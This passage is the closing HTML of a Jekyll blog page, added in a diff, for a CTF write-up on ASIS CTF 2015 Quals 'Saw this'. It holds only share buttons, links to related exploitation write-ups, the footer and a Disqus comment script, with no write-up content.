+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2015-05-24T06:37:00+08:00">May 24, 2015</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=ASIS+CTF+2015+Quals+--+Saw+this+%281+%26+2%29%20http%3A%2F%2F0.0.0.0%3A4000%2Fasis-ctf-2015-quals-saw-this-1%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fasis-ctf-2015-quals-saw-this-1%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fasis-ctf-2015-quals-saw-this-1%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/defcon-ctf-2015-quals-mathwhiz/" class="pagination--pager" title="DEFCON CTF 2015 Quals – mathwhiz
+">Previous</a>
+    
+    
+      <a href="/defcon-ctf-2015-quals-catwestern/" class="pagination--pager" title="DEFCON CTF 2015 Quals – catwestern
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/asis-ctf-2015-quals-saw-this-1/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/asis-ctf-2015-quals-saw-this-1"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
